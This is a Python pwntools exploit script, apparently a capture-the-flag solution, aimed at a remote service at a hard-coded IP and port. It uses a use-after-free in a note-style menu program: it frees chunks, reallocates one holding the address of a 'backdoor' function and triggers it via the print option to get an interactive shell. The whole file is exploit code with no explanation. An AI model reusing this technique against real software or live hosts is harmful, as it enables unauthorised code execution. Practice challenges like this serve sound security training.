from pwn import *

#p=process('./girlfriend2')
p=remote('222.186.56.247',8131)
elf=ELF('./girlfriend')

#context.terminal=['tmux','splitw','w']
backdoor=elf.symbols['backdoor']
sys=elf.symbols['system']

def add(size,name):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.sendline(name)

def dele(index):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))

def prin(index):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))

add(32,'aaa')
add(32,'bbb')
add(32,'ccc')
log.success('add over')
dele(0)
dele(1)
log.success('dele over')
add(24,p64(backdoor))
log.success('add new backdoor')
#pause()
prin(0)
log.success('print over')
p.interactive()
